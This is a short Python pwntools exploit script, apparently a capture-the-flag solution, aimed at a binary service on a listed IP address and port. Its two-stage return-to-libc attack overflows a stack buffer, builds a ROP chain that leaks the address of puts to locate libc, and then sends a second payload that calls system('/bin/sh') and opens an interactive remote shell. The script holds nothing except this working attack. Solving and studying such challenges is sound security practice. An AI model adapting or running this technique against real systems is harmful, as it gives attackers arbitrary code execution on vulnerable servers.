from pwn import *

debug = 0
if(debug):	
	r = process("./something")
	#gdb.attach(r)
	puts_off = 0x00000000000875a0
	sys_off = 0x000000000055410
	binsh_off = 0x1b75aa
else:
	r = remote("103.229.41.18", 5559)
	puts_off = 0x6f6a0
	sys_off = 0x453a0
	binsh_off = 0x18ce57

r.recvuntil(b'Say something :')

puts = 0x401070
gets = 0x401090

bss = 0x00404140
pop_rdi_ret = 0x00000000004012a3
puts_got = 0x000000000404018
main = 0x40120e

payload = b'a'*0x28
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts)
payload += p64(main)

r.sendline(payload)

stuff = r.recvuntil(b'Say something :').split(b'\nHello')[0][-6:]
stuff = int.from_bytes(stuff, "little") - puts_off
print(hex(stuff))

system = stuff + sys_off
binsh = stuff + binsh_off

payload = b'a'*0x28
payload += p64(0x000000000040101a)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)

r.sendline(payload)

r.interactive()
